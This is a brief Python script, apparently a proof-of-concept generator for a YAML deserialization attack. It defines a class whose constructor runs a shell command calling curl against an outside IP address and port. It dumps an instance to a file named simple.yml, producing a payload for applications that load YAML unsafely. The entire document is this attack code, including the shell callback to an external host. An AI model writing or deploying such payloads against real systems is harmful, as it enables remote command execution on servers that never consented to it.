# !/usr/bin/env python
# -*- coding:utf-8 -*-
__author__ = 'bit4'
__github__ = 'https://github.com/bit4woo'
__filename__ = 'yaml_gen_poc.py'

import yaml
import os

class test:
    def __init__(self):
        os.system('curl http://47.108.89.178:2333/success')

payload =  yaml.dump(test())

fp = open('simple.yml','w')
fp.write(payload)